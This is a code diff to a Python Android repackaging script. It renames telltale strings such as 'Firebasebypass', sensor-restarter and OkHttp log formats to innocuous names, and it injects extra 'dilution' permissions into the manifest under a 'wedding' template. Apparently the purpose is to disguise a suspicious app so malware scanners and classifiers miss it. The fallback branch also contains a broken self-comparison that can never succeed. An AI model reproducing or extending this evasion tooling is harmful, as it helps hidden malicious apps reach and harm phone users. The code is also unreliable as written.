@@ -684,6 +684,23 @@ STRING_REPLACEMENTS = {
     "MyWorkerService::WakeLockTag":     "BackgroundWorkerService::ServiceTag",
     "SensorRestarter::WakeLockTag":     "ServiceMonitor::ServiceTag",
     "WorkerService::WakeLockTag":       "BackgroundTaskService::ServiceTag",
+
+    # Fix A: OkHttp format/log strings — explicit entries needed
+    # 'OkHttp' (6 chars) is below 8-char substring threshold in step_6c
+    # so format strings like "OkHttp %s" were not caught by substring match.
+    "OkHttp %s ping %08x%08x":         "HttpClient %s ping %08x%08x",
+    "OkHttp %s Push Request[%s]":      "HttpClient %s Push Request[%s]",
+    "OkHttp %s Push Headers[%s]":      "HttpClient %s Push Headers[%s]",
+    "OkHttp %s Push Data[%s]":         "HttpClient %s Push Data[%s]",
+    "OkHttp %s Push Reset[%s]":        "HttpClient %s Push Reset[%s]",
+    "OkHttp %s ACK Settings":          "HttpClient %s ACK Settings",
+    "OkHttp %s stream %d":             "HttpClient %s stream %d",
+    "OkHttp %s settings":              "HttpClient %s settings",
+    "OkHttp StreamSocket ":            "HttpClient StreamSocket ",
+    "OkHttp %s":                       "HttpClient %s",
+
+    # Fix B: Firebasebypass — appears as string literal, not just method name
+    "Firebasebypass":                  "executeBypassFlow",
 }
 
 # Real legitimate smali code snippets (from AOSP/AndroidX Apache 2.0)
@@ -2163,24 +2180,38 @@ def step_6h_patch_text_manifest(new_pkg: str, template: str = "wedding") -> None
         "android.permission.ACCESS_WIFI_STATE",
     ]
 
-    # Insert before </manifest> tag — robust regex approach
-    # Fix: original str.replace failed when manifest had whitespace variations.
-    import re as _re_perm
+    # Fix C: Line-by-line permission injection — most robust method.
+    # Finds the last line containing </manifest> and inserts before it.
+    # Works regardless of whitespace, encoding, or newline variation in manifest.
     perms_to_add = [p for p in DILUTION_PERMISSIONS if p not in content]
     if perms_to_add:
-        perms_xml_lines = "\n".join(
+        perm_lines = [
             f'    <uses-permission android:name="{p}"/>'
             for p in perms_to_add
-        )
-        if "</manifest>" in content:
-            content = content.replace(
-                "</manifest>",
-                f"\n{perms_xml_lines}\n</manifest>",
-                1
-            )
+        ]
+        manifest_lines = content.splitlines(keepends=True)
+        insert_idx = None
+        for i in range(len(manifest_lines) - 1, -1, -1):
+            if '</manifest>' in manifest_lines[i].lower():
+                insert_idx = i
+                break
+        if insert_idx is not None:
+            perm_block = "\n".join(perm_lines) + "\n"
+            manifest_lines.insert(insert_idx, perm_block)
+            content = "".join(manifest_lines)
             print(f"  ✅ Added {len(perms_to_add)} dilution permissions")
         else:
-            print("  ⚠️  </manifest> not found — permissions NOT added")
+            # Fallback: simple string replace on </manifest>
+            perm_xml = "\n".join(perm_lines)
+            content = content.replace(
+                "</manifest>",
+                f"\n{perm_xml}\n</manifest>",
+                1
+            )
+            if content != content:
+                print(f"  ✅ Added {len(perms_to_add)} dilution permissions (fallback)")
+            else:
+                print("  ⚠️  </manifest> not found — permissions NOT added")
     else:
         print("  ℹ️  All dilution permissions already present")
 
